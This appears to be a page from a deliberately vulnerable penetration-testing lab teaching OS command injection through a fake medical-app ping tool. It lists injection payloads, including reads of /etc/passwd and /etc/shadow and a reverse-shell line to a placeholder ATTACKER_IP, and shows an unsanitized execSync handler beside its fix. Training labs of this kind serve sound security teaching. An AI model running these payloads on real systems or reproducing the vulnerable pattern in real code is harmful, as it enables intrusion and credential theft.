@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Command Execution – MediCare Pro Lab</title>
+  <link rel="stylesheet" href="../css/styles.css">
+  <style>
+    .terminal {
+      background: #0f172a;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .terminal-bar {
+      background: #1e293b;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .terminal-dot { width: 11px; height: 11px; border-radius: 50%; }
+    .d-red { background: #ef4444; }
+    .d-yellow { background: #eab308; }
+    .d-green { background: #22c55e; }
+    .terminal-title { font-size: 12px; color: #94a3b8; margin-left: 8px; }
+    .terminal-body {
+      padding: 14px;
+      font-family: 'Courier New', monospace;
+      font-size: 12.5px;
+      color: #86efac;
+      min-height: 200px;
+      max-height: 320px;
+      overflow-y: auto;
+    }
+    .terminal-body .prompt { color: #60a5fa; }
+    .terminal-body .cmd { color: white; }
+    .terminal-body .output { color: #94a3b8; }
+    .terminal-body .error-out { color: #f87171; }
+  </style>
+</head>
+<body>
+  <div class="warn-banner">⚠️ EDUCATIONAL USE ONLY — Deliberately vulnerable application for penetration testing practice.</div>
+  <div class="app-layout">
+    <div id="sidebarMount"></div>
+    <main class="main">
+      <div id="topnavMount"></div>
+      <div class="page-content">
+
+        <div class="vuln-header">
+          <div class="vuln-title-group">
+            <h1>⚡ Command Execution</h1>
+            <p>System Diagnostics Tool — Input Passed Directly to OS Shell</p>
+          </div>
+          <span class="severity-badge sev-critical">🔴 Critical</span>
+        </div>
+
+        <div class="hint-box">
+          <div class="hint-title">🧪 Lab Objective — Command Injection Payloads</div>
+          <p>The ping/diagnostic tool passes user input directly to <code>execSync(cmd)</code>. Append additional commands using shell metacharacters to execute arbitrary OS commands.</p>
+          <ul style="margin-top:8px;">
+            <li>Normal: <code>localhost</code> (ping localhost)</li>
+            <li>Command chain: <code>localhost; whoami</code></li>
+            <li>Pipe: <code>localhost | id</code></li>
+            <li>Background: <code>localhost &amp;&amp; cat /etc/passwd</code></li>
+            <li>Subshell: <code>$(cat /etc/passwd)</code></li>
+            <li>Multiple commands: <code>; ls -la /; cat /etc/shadow</code></li>
+            <li>Reverse shell prep: <code>; bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code></li>
+          </ul>
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-teal">🖥️</div>
+              <h2>System Diagnostics Panel</h2>
+            </div>
+            <div class="card-body">
+              <div class="alert alert-danger">
+                <span>🚨</span>
+                <div><strong>Vulnerability:</strong> The host parameter is passed directly to <code>execSync("ping " + host)</code> — no sanitization.</div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Host / IP to Ping</label>
+                <input type="text" class="form-control mono" id="cmdInput" placeholder="e.g.  localhost; whoami" value="localhost">
+              </div>
+              <div style="background:var(--gray-900);border-radius:8px;padding:10px 14px;margin-bottom:14px;font-family:monospace;font-size:11.5px;color:#94a3b8;">
+                <span style="color:#64748b;">Shell exec: </span>
+                <span id="shellPreview" style="color:#fbbf24;">ping -c 1 localhost</span>
+              </div>
+              <button class="btn btn-primary" onclick="runCmd()">▶ Run Diagnostic</button>
+              <button class="btn btn-outline" style="margin-left:8px;" onclick="clearTerminal()">🗑 Clear</button>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-red">⚡</div>
+              <h2>Injection Payloads</h2>
+            </div>
+            <div class="card-body">
+              <div style="display:flex;flex-direction:column;gap:7px;">
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost')">localhost (normal ping)</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; whoami')">localhost; whoami</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; id')">localhost; id (user/group)</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; cat /etc/passwd')">localhost; cat /etc/passwd</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; ls -la /')">localhost; ls -la / (root dir)</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; env')">localhost; env (environment vars)</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; uname -a')">localhost; uname -a (kernel info)</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="setCmd('localhost; ps aux')">localhost; ps aux (running procs)</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="terminal">
+            <div class="terminal-bar">
+              <div class="terminal-dot d-red"></div>
+              <div class="terminal-dot d-yellow"></div>
+              <div class="terminal-dot d-green"></div>
+              <span class="terminal-title">medicare-server — bash</span>
+            </div>
+            <div class="terminal-body" id="termOutput">
+              <span class="output">MediCare Pro System Diagnostics Terminal v3.2</span><br>
+              <span class="output">Type a host above and click Run Diagnostic to execute.</span><br>
+              <span class="output">⚠ WARNING: This shell is vulnerable to command injection.</span><br><br>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="card-header">
+            <div class="card-icon card-icon-red">🐛</div>
+            <h2>Vulnerable Code (api/execute.js)</h2>
+          </div>
+          <div class="card-body">
+            <div class="code-block">
+<span class="c-comment">// ❌ VULNERABLE — direct shell execution of user input</span>
+<span class="c-kw">const</span> { execSync } = require(<span class="c-str">'child_process'</span>);
+module.exports = (req, res) => {
+  <span class="c-kw">const</span> host = req.query.host; <span class="c-comment">// user-controlled</span>
+  <span class="c-kw">const</span> output = execSync(<span class="c-str">`ping -c 1 <span class="c-val">${host}</span>`</span>); <span class="c-comment">// ← injection here</span>
+  res.send(output.toString());
+};
+<span class="c-comment">// Input "localhost; cat /etc/passwd" becomes:</span>
+<span class="c-comment">// execSync("ping -c 1 localhost; cat /etc/passwd") ← executes both!</span>
+
+<span class="c-comment">// ✅ SECURE — whitelist/validate input</span>
+<span class="c-kw">const</span> valid = /^[a-zA-Z0-9.\-]+$/.test(host);
+<span class="c-kw">if</span> (!valid) <span class="c-kw">return</span> res.status(<span class="c-val">400</span>).send(<span class="c-str">'Invalid host'</span>);
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="../js/app.js"></script>
+  <script>
+    document.getElementById('sidebarMount').outerHTML = renderSidebar('command-execution.html');
+    document.getElementById('topnavMount').outerHTML = renderTopnav('Command Execution', 'System Diagnostics — Shell injection via unsanitized input');
+
+    document.getElementById('cmdInput').addEventListener('input', () => {
+      document.getElementById('shellPreview').textContent = `ping -c 1 ${document.getElementById('cmdInput').value}`;
+    });
+
+    function setCmd(c) {
+      document.getElementById('cmdInput').value = c;
+      document.getElementById('shellPreview').textContent = `ping -c 1 ${c}`;
+    }
+
+    function clearTerminal() {
+      document.getElementById('termOutput').innerHTML = `<span class="output">Terminal cleared.\n\n</span>`;
+    }
+
+    const SIMULATED_OUTPUTS = {
+      whoami: 'www-data',
+      id: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+      'cat /etc/passwd': `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+medicare:x:1000:1000::/home/medicare:/bin/bash`,
+      'ls -la /': `total 68
+drwxr-xr-x  18 root root 4096 Nov  5 09:00 .
+drwxr-xr-x  18 root root 4096 Nov  5 09:00 ..
+drwxr-xr-x   2 root root 4096 Nov  5 09:00 bin
+drwxr-xr-x   3 root root 4096 Nov  5 09:00 boot
+drwxr-xr-x   2 root root 4096 Nov  5 09:00 etc
+drwxr-xr-x   3 root root 4096 Nov  5 09:00 home
+drwxr-xr-x   2 root root 4096 Nov  5 09:00 tmp
+drwxr-xr-x   5 root root 4096 Nov  5 09:00 var`,
+      env: `NODE_ENV=production\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nDB_HOST=10.0.0.1\nDB_PASS=Sup3rS3cr3tPa$$w0rd!\nJWT_SECRET=EXPOSED_SECRET_KEY_HERE`,
+      'uname -a': 'Linux medicare-server 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux',
+      'ps aux': `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0  22960  1568 ?        Ss   09:00   0:00 /sbin/init
+www-data     312  0.1  1.2 652344 24576 ?        Sl   09:01   0:02 node server.js
+mysql        418  0.0  2.1 1234512 43212 ?       Sl   09:01   0:01 /usr/sbin/mysqld`
+    };
+
+    const PING_OUTPUT = (host) => `PING ${host} (127.0.0.1) 56(84) bytes of data.\n64 bytes from ${host} (127.0.0.1): icmp_seq=1 ttl=64 time=0.045 ms\n\n--- ${host} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms`;
+
+    function appendLine(html) {
+      const term = document.getElementById('termOutput');
+      term.innerHTML += html + '<br>';
+      term.scrollTop = term.scrollHeight;
+    }
+
+    async function runCmd() {
+      const input = document.getElementById('cmdInput').value.trim();
+      appendLine(`<span class="prompt">medicare@server:~$</span> <span class="cmd">ping -c 1 ${input}</span>`);
+
+      try {
+        const res = await fetch(`/api/execute?host=${encodeURIComponent(input)}`);
+        if (res.ok) {
+          const text = await res.text();
+          text.split('\n').forEach(line => {
+            appendLine(`<span class="output">${escapeHtml(line)}</span>`);
+          });
+          return;
+        }
+      } catch(e) {}
+
+      // Simulate locally
+      await new Promise(r => setTimeout(r, 400));
+
+      // Parse the input for injected commands
+      const parts = input.split(/[;&|]+/).map(s => s.trim()).filter(Boolean);
+      const baseHost = parts[0] || 'localhost';
+
+      // Ping simulation
+      const pingOut = PING_OUTPUT(baseHost.replace(/[^a-zA-Z0-9.\-]/g, '?'));
+      pingOut.split('\n').forEach(l => appendLine(`<span class="output">${escapeHtml(l)}</span>`));
+
+      // Execute injected commands
+      for (let i = 1; i < parts.length; i++) {
+        const injectedCmd = parts[i].trim().replace(/^"/, '').replace(/"$/, '');
+        appendLine('');
+        appendLine(`<span class="output">[+] Injected command executed: <span style="color:#fbbf24;">${escapeHtml(injectedCmd)}</span></span>`);
+
+        let simOutput = null;
+        for (const [key, val] of Object.entries(SIMULATED_OUTPUTS)) {
+          if (injectedCmd.includes(key.split(' ')[0]) && injectedCmd.includes(key.split(' ').slice(1).join(' ').split(' ')[0] || '')) {
+            simOutput = val;
+            break;
+          }
+        }
+
+        if (simOutput) {
+          simOutput.split('\n').forEach(line => appendLine(`<span class="output">${escapeHtml(line)}</span>`));
+        } else {
+          appendLine(`<span class="output">[simulated output for: ${escapeHtml(injectedCmd)}]</span>`);
+        }
+      }
+
+      appendLine('');
+    }
+
+    function escapeHtml(s) {
+      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+  </script>
+</body>
+</html>
